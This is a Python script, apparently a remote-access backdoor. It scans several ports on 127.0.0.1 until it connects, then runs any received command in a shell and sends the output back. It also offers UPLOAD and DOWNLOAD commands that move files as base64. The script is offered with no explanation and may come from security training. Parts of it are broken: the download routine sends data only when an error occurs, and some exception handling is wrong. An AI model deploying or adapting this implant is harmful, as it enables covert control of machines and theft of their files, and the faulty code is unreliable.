import socket
import time
import subprocess
import codecs

def upload(mysocket):
    mysocket.send(b"What is the name of the file you are uploading?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"What unique string will end the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(b"Transmit the file as a base64 encoded followed by the end of file \n")
    data = b""
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(fname.strip(), "w")
        fh.write(codecs.decode(data[:-len(endoffile)], "base64").decode("latin1"))
        fh.close()
    except Exception as e:
        mysocket.send("An error occurred while uploading file {0}. {1}".format(fname, str(e)))
    else:
        mysocket.send(fname.strip().encode() + b"successfully uploaded")

def download(mysocket):
    mysocket.send(b"What file do you want (including path)?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"Receive a base64 encoded string containing your file will end with !EOF!\n")
    try:
        data = codecs.encode(open(fname.strip(),"rb").read(), "base64")
    except Exception as e:
        data = "An error occurred while downloading the file {0}.{1}".format(fname, str(e)).encode()
        mysocket.sendall(data + "!EOF!".encode())

def scan_and_connect():
    print("it started")
    connected = False
    while not connected:
        for port in [21, 22, 81, 443, 8000]:
            time.sleep(1)
            try:
                print("Trying", port, end=' ')
                mysocket.connect(("127.0.0.1", port))
            except socket.error:
                print("Nope")
                continue
            else:
                print("Connected")
                connected = True
                break

mysocket = socket.socket()
scan_and_connect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode()
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            scan_and_connect()
            continue
        if commandrequested[:4] == "QUIT":
            mysocket.send(b"Terminating Connection.")
            break
        if commandrequested[:6] == "UPLOAD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNLOAD":
            download(mysocket)
            continue
        prochandle = subprocess.Popen(commandrequested, shell = True, stdout = subprocess.PIPE,
        stdin = subprocess.PIPE, stderr = subprocess.PIPE)
        results, errors = prochandle.communicate()
        results = results + errors
        mysocket.send(results)
    except socket.error():
        break
    except Exception as e:
        mysocket.send(bytes(str(e), "utf-8"))
        break